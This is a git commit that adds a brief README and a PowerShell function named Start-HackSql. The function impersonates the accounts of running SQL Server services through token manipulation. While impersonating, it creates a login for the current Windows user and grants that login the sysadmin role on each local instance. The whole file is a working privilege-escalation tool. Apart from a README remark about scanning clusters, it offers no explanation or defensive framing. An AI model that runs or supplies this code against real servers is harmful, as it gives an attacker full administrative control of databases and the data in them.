53e1ec315323e0f00342c72f5ed40cefc25ba93e
codykonior <cody@codykonior.com>
2015-08-30 13:26:02 +0800

    hack function

---
+++ README.md
@@ -0,0 +1,3 @@
+Start-HackSql could be improved to scan for a local cluster first (to
+extract network names) instead of assuming the local computer is the
+right network name to use.
---
+++ Start-HackSql.ps1
@@ -0,0 +1,47 @@
+function Start-HackSql {
+    [CmdletBinding()]
+    param (
+    )
+
+    Begin {
+
+    } 
+
+    Process {
+        $userName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+
+        $services = Get-Service | Where { ($_.Name -eq 'MSSQLSERVER' -or $_.Name -like 'MSSQL$*') -and $_.Status -eq "Running" }
+        foreach ($service in $services) {
+            if ($service.Name -eq "MSSQLSERVER") {
+                $sqlName = ".\"
+            } else {
+                $sqlName = ".\$($service.Name.Substring(6))"
+            }
+
+            Write-Host "Attempting $sqlName"
+            $serviceProcess = Get-WmiObject -Class Win32_Service -Filter "Name = '$($service.Name)'"
+
+            Invoke-TokenManipulation -ProcessId $serviceProcess.ProcessID -ImpersonateUser | Out-Null
+            $impersonatedUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+            Write-Host "Service $($service.Name) on PID $($serviceProcess.ProcessID) will connect to $sqlName as $impersonatedUser"
+
+            $sqlConnection = New-Object System.Data.SqlClient.SqlConnection("Data Source=$sqlName;Trusted_Connection=True")
+            $sqlConnection.Open()
+            $sqlCommand = New-Object System.Data.SqlClient.SqlCommand("If Not Exists (Select Top 1 0 From sys.server_principals Where name = '$userName')
+Begin
+    Create Login [$userName] From Windows
+End
+
+If Not Exists (Select Top 1 0 From master.sys.server_principals sp Join master.sys.server_role_members srp On sp.principal_id = srp.member_principal_id Join master.sys.server_principals spr On srp.role_principal_id = spr.principal_id Where sp.name = '$userName' And spr.name = 'sysadmin')
+Begin
+    Exec sp_addsrvrolemember '$userName', 'sysadmin'
+End", $sqlConnection)
+            $sqlCommand.ExecuteNonQuery() | Out-Null
+            $sqlConnection.Close()
+            Invoke-TokenManipulation -RevToSelf | Out-Null
+        }
+    }
+    End {
+
+    }
+}
